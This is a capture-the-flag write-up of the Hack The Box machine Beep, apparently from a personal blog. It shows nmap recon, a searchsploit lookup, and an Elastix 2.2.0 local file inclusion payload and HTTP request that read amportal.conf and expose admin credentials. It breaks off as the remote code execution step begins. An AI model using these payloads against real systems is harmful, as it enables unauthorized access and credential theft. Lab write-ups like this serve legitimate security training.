@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Beep (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Beep from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/beep/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Beep (Easy)">
+<meta property="og:description" content="Writeup of Beep from Hack The Box." />
+<meta property="og:url" content="/posts/beep/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-19 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/beep/">HTB Writeup - Beep (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-19</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="/tags/lfi/">LFI</a>&nbsp;
+      
+      #<a href="/tags/rce/">RCE</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Beep</code> machine is an easy linux box.</p>
+<p><img src="/images/Beep.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>nmap scan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -A -sC -sV 10.10.10.7
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-07-19 09:02 EDT
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh        OpenSSH 4.3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">1024</span> ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">2048</span> bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>25/tcp    open  smtp       Postfix smtpd
+</span></span><span style="display:flex;"><span>|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+</span></span><span style="display:flex;"><span>80/tcp    open  http       Apache httpd 2.2.3
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://10.10.10.7/
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.2.3 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+</span></span><span style="display:flex;"><span>|_pop3-capabilities: UIDL LOGIN-DELAY<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> RESP-CODES TOP PIPELINING AUTH-RESP-CODE STLS APOP USER IMPLEMENTATION<span style="color:#f92672">(</span>Cyrus POP3 server v2<span style="color:#f92672">)</span> EXPIRE<span style="color:#f92672">(</span>NEVER<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind    <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)</span>
+</span></span><span style="display:flex;"><span>| rpcinfo: 
+</span></span><span style="display:flex;"><span>|   program version    port/proto  service
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  <span style="color:#ae81ff">2</span>            111/tcp   rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  <span style="color:#ae81ff">2</span>            111/udp   rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>            875/udp   status
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>            878/tcp   status
+</span></span><span style="display:flex;"><span>143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+</span></span><span style="display:flex;"><span>|_imap-capabilities: IMAP4rev1 MULTIAPPEND RENAME Completed ATOMIC NAMESPACE OK CHILDREN URLAUTHA0001 LITERAL+ IMAP4 ANNOTATEMORE RIGHTS<span style="color:#f92672">=</span>kxte LIST-SUBSCRIBED X-NETSCAPE NO UNSELECT CONDSTORE UIDPLUS IDLE CATENATE THREAD<span style="color:#f92672">=</span>REFERENCES THREAD<span style="color:#f92672">=</span>ORDEREDSUBJECT STARTTLS QUOTA BINARY MAILBOX-REFERRALS ACL SORT LISTEXT SORT<span style="color:#f92672">=</span>MODSEQ ID
+</span></span><span style="display:flex;"><span>443/tcp   open  ssl/http   Apache httpd 2.2.3 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2023-07-19T13:06:09+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>|_http-title: Elastix - Login page
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost.localdomain/organizationName<span style="color:#f92672">=</span>SomeOrganization/stateOrProvinceName<span style="color:#f92672">=</span>SomeState/countryName<span style="color:#f92672">=</span>--
+</span></span><span style="display:flex;"><span>| Not valid before: 2017-04-07T08:22:08
+</span></span><span style="display:flex;"><span>|_Not valid after:  2018-04-07T08:22:08
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.2.3 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>993/tcp   open  ssl/imap   Cyrus imapd
+</span></span><span style="display:flex;"><span>|_imap-capabilities: CAPABILITY
+</span></span><span style="display:flex;"><span>995/tcp   open  pop3       Cyrus pop3d
+</span></span><span style="display:flex;"><span>3306/tcp  open  mysql      MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>4445/tcp  open  upnotifyp?
+</span></span><span style="display:flex;"><span>10000/tcp open  ssl/http   MiniServ 1.570 <span style="color:#f92672">(</span>Webmin httpd<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>*/organizationName<span style="color:#f92672">=</span>Webmin Webserver on localhost.localdomain
+</span></span><span style="display:flex;"><span>| Not valid before: 2017-04-07T08:24:46
+</span></span><span style="display:flex;"><span>|_Not valid after:  2022-04-06T08:24:46
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; Charset<span style="color:#f92672">=</span>iso-8859-1<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_http-trane-info: Problem with XML parsing of /evox/about
+</span></span><span style="display:flex;"><span>|_ssl-date: 2023-07-19T13:06:09+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 439.20 seconds
+</span></span><span style="display:flex;"><span>       
+</span></span></code></pre></div><p>I see a intersting  port where there is in execution <code>Elastix</code></p>
+<h2 id="http">HTTP<a href="#http" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I search a exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit Elastix         
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                                                                         |  Path
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Elastix - <span style="color:#e6db74">&#39;page&#39;</span> Cross-Site Scripting                                                                                                                                                                  | php/webapps/38078.py
+</span></span><span style="display:flex;"><span>Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                                | php/webapps/38544.txt
+</span></span><span style="display:flex;"><span>Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                          | php/webapps/34942.txt
+</span></span><span style="display:flex;"><span>Elastix 2.2.0 - <span style="color:#e6db74">&#39;graph.php&#39;</span> Local File Inclusion                                                                                                                                                       | php/webapps/37637.pl
+</span></span><span style="display:flex;"><span>Elastix 2.x - Blind SQL Injection                                                                                                                                                                      | php/webapps/36305.txt
+</span></span><span style="display:flex;"><span>Elastix &lt; 2.5 - PHP Code Injection                                                                                                                                                                     | php/webapps/38091.php
+</span></span><span style="display:flex;"><span>FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                                                 | php/webapps/18650.py
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit -m 37637.pl
+</span></span><span style="display:flex;"><span>  Exploit: Elastix 2.2.0 - <span style="color:#e6db74">&#39;graph.php&#39;</span> Local File Inclusion
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/37637
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
+</span></span><span style="display:flex;"><span>    Codes: N/A
+</span></span><span style="display:flex;"><span> Verified: True
+</span></span><span style="display:flex;"><span>File Type: ASCII text
+</span></span><span style="display:flex;"><span>Copied to: /home/kali/37637.pl
+</span></span></code></pre></div><h2 id="local-file-inclusion">Local File Inclusion<a href="#local-file-inclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I read the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>source: https:<span style="color:#e6db74">//</span>www<span style="color:#f92672">.</span>securityfocus<span style="color:#f92672">.</span>com<span style="color:#e6db74">/bid/</span><span style="color:#ae81ff">55078</span><span style="color:#f92672">/</span>info
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Elastix is prone to a local file<span style="color:#f92672">-</span>include vulnerability because it fails to properly sanitize user<span style="color:#f92672">-</span>supplied input<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>An attacker can exploit this vulnerability to view files <span style="color:#f92672">and</span> execute local scripts in the context of the web server process<span style="color:#f92672">.</span> This may aid in further attacks<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Elastix <span style="color:#ae81ff">2.2.0</span> is vulnerable; other versions may also be affected<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/perl -w</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#------------------------------------------------------------------------------------#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Elastix is an Open Source Sofware to establish Unified Communications.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#About this concept, Elastix goal is to incorporate all the communication alternatives,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#available at an enterprise level, into a unique solution.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#------------------------------------------------------------------------------------#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">############################################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Elastix 2.2.0 LFI</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Google Dork: :(</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Author: cheki</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version:Elastix 2.2.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: multiple</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE : notyet</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># romanc-_-eyes ;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Discovered by romanc-_-eyes</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># vendor http://www.elastix.org/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;\t Elastix 2.2.0 LFI Exploit \n&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;\t code author cheki   \n&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;\t 0day Elastix 2.2.0  \n&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;\t email: anonymous17hacker{}gmail.com \n&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><ul>
+<li>Payload:</li>
+</ul>
+<pre tabindex="0"><code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action
+</code></pre><p>I try the exploit :</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=/etc/passwd <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.10.7</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">testing=1; elastixSession=gnq99bf8gq7i599b799qorvo63</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Sec-Ch-Ua<span style="color:#f92672">:</span><span style="color:#ae81ff"> </span>
+</span></span><span style="display:flex;"><span>Sec-Ch-Ua-Mobile<span style="color:#f92672">:</span> <span style="color:#ae81ff">?0</span>
+</span></span><span style="display:flex;"><span>Sec-Ch-Ua-Platform<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#f92672">:</span> <span style="color:#ae81ff">none</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#f92672">:</span> <span style="color:#ae81ff">navigate</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-User<span style="color:#f92672">:</span> <span style="color:#ae81ff">?1</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#f92672">:</span> <span style="color:#ae81ff">document</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Date: Wed, 19 Jul 2023 15:19:29 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Server: Apache/2.2.3 (CentOS)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>X-Powered-By: PHP/5.1.6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset=UTF-8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Content-Length: 13779
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># This file is part of FreePBX.
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span>#    FreePBX is free software: you can redistribute it and/or modify
+</span></span><span style="display:flex;"><span>#    it under the terms of the GNU General Public License as published by
+</span></span><span style="display:flex;"><span>#    the Free Software Foundation, either version 2 of the License, or
+</span></span><span style="display:flex;"><span>#    (at your option) any later version.
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span>#    FreePBX is distributed in the hope that it will be useful,
+</span></span><span style="display:flex;"><span>#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+</span></span><span style="display:flex;"><span>#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+</span></span><span style="display:flex;"><span>#    GNU General Public License for more details.
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span>#    You should have received a copy of the GNU General Public License
+</span></span><span style="display:flex;"><span>#    along with FreePBX.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span># This file contains settings for components of the Asterisk Management Portal
+</span></span><span style="display:flex;"><span># Spaces are not allowed!
+</span></span><span style="display:flex;"><span># Run /usr/src/AMP/apply_conf.sh after making changes to this file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># FreePBX Database configuration
+</span></span><span style="display:flex;"><span># AMPDBHOST: Hostname where the FreePBX database resides
+</span></span><span style="display:flex;"><span># AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
+</span></span><span style="display:flex;"><span># AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
+</span></span><span style="display:flex;"><span># AMPDBUSER: Username used to connect to the FreePBX database
+</span></span><span style="display:flex;"><span># AMPDBPASS: Password for AMPDBUSER (above)
+</span></span><span style="display:flex;"><span># AMPENGINE: Telephony backend engine (e.g. asterisk)
+</span></span><span style="display:flex;"><span># AMPMGRUSER: Username to access the Asterisk Manager Interface
+</span></span><span style="display:flex;"><span># AMPMGRPASS: Password for AMPMGRUSER
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span>AMPDBHOST=localhost
+</span></span><span style="display:flex;"><span>AMPDBENGINE=mysql
+</span></span><span style="display:flex;"><span># AMPDBNAME=asterisk
+</span></span><span style="display:flex;"><span>AMPDBUSER=asteriskuser
+</span></span><span style="display:flex;"><span># AMPDBPASS=amp109
+</span></span><span style="display:flex;"><span>AMPDBPASS=jEhdIekWmdjE
+</span></span><span style="display:flex;"><span>AMPENGINE=asterisk
+</span></span><span style="display:flex;"><span>AMPMGRUSER=admin
+</span></span><span style="display:flex;"><span>#AMPMGRPASS=amp111
+</span></span><span style="display:flex;"><span>AMPMGRPASS=jEhdIekWmdjE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># AMPBIN: Location of the FreePBX command line scripts
+</span></span><span style="display:flex;"><span># AMPSBIN: Location of (root) command line scripts
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span>AMPBIN=/var/lib/asterisk/bin
+</span></span><span style="display:flex;"><span>AMPSBIN=/usr/local/sbin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># AMPWEBROOT: Path to Apache&#39;s webroot (leave off trailing slash)
+</span></span><span style="display:flex;"><span># AMPCGIBIN: Path to Apache&#39;s cgi-bin dir (leave off trailing slash)
+</span></span><span style="display:flex;"><span># AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span>AMPWEBROOT=/var/www/html
+</span></span><span style="display:flex;"><span>AMPCGIBIN=/var/www/cgi-bin 
+</span></span><span style="display:flex;"><span># AMPWEBADDRESS=x.x.x.x|hostname
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
+</span></span><span style="display:flex;"><span># FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
+</span></span><span style="display:flex;"><span># FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
+</span></span><span style="display:flex;"><span># FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
+</span></span><span style="display:flex;"><span># or if you don&#39;t want FOP.
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span>#FOPRUN=true
+</span></span><span style="display:flex;"><span>FOPWEBROOT=/var/www/html/panel
+</span></span><span style="display:flex;"><span>#FOPPASSWORD=passw0rd
+</span></span><span style="display:flex;"><span>FOPPASSWORD=jEhdIekWmdjE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># FOPSORT=extension|lastname
+</span></span><span style="display:flex;"><span># DEFAULT VALUE: extension
+</span></span><span style="display:flex;"><span># FOP should sort extensions by Last Name [lastname] or by Extension [extension]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># This is the default admin name used to allow an administrator to login to ARI bypassing all security.
+</span></span><span style="display:flex;"><span># Change this to whatever you want, don&#39;t forget to change the ARI_ADMIN_PASSWORD as well
+</span></span><span style="display:flex;"><span>ARI_ADMIN_USERNAME=admin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># This is the default admin password to allow an administrator to login to ARI bypassing all security.
+</span></span><span style="display:flex;"><span># Change this to a secure password.
+</span></span><span style="display:flex;"><span>ARI_ADMIN_PASSWORD=jEhdIekWmdjE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># AUTHTYPE=database|none
+</span></span><span style="display:flex;"><span># Authentication type to use for web admininstration. If type set to &#39;database&#39;, the primary
+</span></span><span style="display:flex;"><span># AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
+</span></span><span style="display:flex;"><span>AUTHTYPE=database
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># AMPMODULESVN is the prefix that is appended to &lt;location&gt; tags in the XML file.
+</span></span><span style="display:flex;"><span># This should be set to http://mirror.freepbx.org/modules/
+</span></span><span style="display:flex;"><span>AMPMODULESVN=http://mirror.freepbx.org/modules/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>AMPDBNAME=asterisk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ASTETCDIR=/etc/asterisk
+</span></span><span style="display:flex;"><span>ASTMODDIR=/usr/lib/asterisk/modules
+</span></span><span style="display:flex;"><span>ASTVARLIBDIR=/var/lib/asterisk
+</span></span><span style="display:flex;"><span>ASTAGIDIR=/var/lib/asterisk/agi-bin
+</span></span><span style="display:flex;"><span>ASTSPOOLDIR=/var/spool/asterisk
+</span></span><span style="display:flex;"><span>ASTRUNDIR=/var/run/asterisk
+</span></span><span style="display:flex;"><span>ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
+</span></span></code></pre></div><p>I find the <code>credentials</code>, I use they to do access via the login page https://10.10.10.7:</p>
+<pre tabindex="0"><code>admin:jEhdIekWmdjE
+</code></pre><h2 id="remote-code-execution-and--foothold">Remote Code Execution and  Foothold<a href="#remote-code-execution-and--foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I search a exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit Elastix         
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                                                                         |  Path
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Elastix - <span style="color:#e6db74">&#39;page&#39;</span> Cross-Site Scripting                                                                                                                                                                  | php/webapps/38078.py
+</span></span><span style="display:flex;"><span>Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                                | php/webapps/38544.txt
+</span></span><span style="display:flex;"><span>Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                          | php/webapps/34942.txt
+</span></span><span style="display:flex;"><span>Elastix 2.2.0 - <span style="color:#e6db74">&#39;graph.php&#39;</span> Local File Inclusion                                                                                                                                                       | php/webapps/37637.pl
